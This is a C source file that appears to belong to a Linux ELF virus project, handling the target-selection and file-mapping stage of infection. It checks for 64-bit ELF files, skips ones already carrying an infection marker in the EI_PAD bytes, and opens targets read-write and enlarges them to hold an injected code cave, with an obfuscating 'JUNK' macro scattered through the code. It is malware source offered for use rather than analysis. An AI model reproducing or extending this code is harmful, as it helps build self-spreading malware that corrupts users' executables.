#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

#include "death.h"
#include "famine.h"
#include "utils.h"
#include "map.h"
#include "syscall.h"

int	check_elf_magic(int fd) {
	Elf64_Ehdr ehdr;
	uint32_t magic; JUNK;

	if (pread(fd, &ehdr, sizeof(Elf64_Ehdr), 0) != sizeof(Elf64_Ehdr) ||
		ehdr.e_ident[EI_MAG0] != ELFMAG0 ||
		ehdr.e_ident[EI_MAG1] != ELFMAG1 ||
		ehdr.e_ident[EI_MAG2] != ELFMAG2 ||
		ehdr.e_ident[EI_MAG3] != ELFMAG3) {
		return -1;
	} JUNK;

	/* check if it's a 64-bit elf */
	if (ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
		return -1;
	} JUNK;

	/* check EI_PAD to see if its infected */
	magic = *(uint32_t *)&ehdr.e_ident[EI_PAD];
	if (magic == MAGIC_NUMBER) {
		return -1;
	}

	return 0;
}


int get_bss_size(int fd, uint64_t* bss_len, size_t size) {
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;

	char *ptr = (char *)mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (ptr == MAP_FAILED) {
		return 1;
	} JUNK;

	ehdr = (Elf64_Ehdr *)ptr;
	phdr = (Elf64_Phdr *)(ptr + ehdr->e_phoff);

	for (size_t i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)) {
			*bss_len = phdr[i].p_memsz - phdr[i].p_filesz;
			break;
		}
	}

	if (munmap(ptr, size) == -1) {
		return 1;
	} JUNK;

	return 0;
}


int map_file(const char *filename, data_t *data) {
	int		fd;
	uint8_t	*file;
	struct stat st;

	/* read + write */
	fd = open(filename, O_RDWR);
	if (fd == -1) {
		return -1;
	} JUNK;

	if (fstat(fd, &st) == -1) {
		close(fd);
		return -1;
	}

	if (check_elf_magic(fd) == -1) {
		close(fd);
		return -1;
	}

	uint64_t bss_len = 0;
	if (get_bss_size(fd, &bss_len, st.st_size) == -1) {
		close(fd);
		return -1;
	} JUNK;

	const size_t size = st.st_size + data->cave.p_size + bss_len;

	if (ftruncate(fd, size) == -1) {
		close(fd);
		return -1;
	}

	file = (uint8_t *)mmap(NULL, size, PROT_READ | PROT_WRITE , MAP_PRIVATE, fd, 0);
	if (file == MAP_FAILED) {
		close(fd);
		return -1;
	} JUNK;

	close(fd);

	data->elf.size = st.st_size;
	data->file = file;
	data->size = size;
	data->elf.mode = st.st_mode;

	return 0;
}
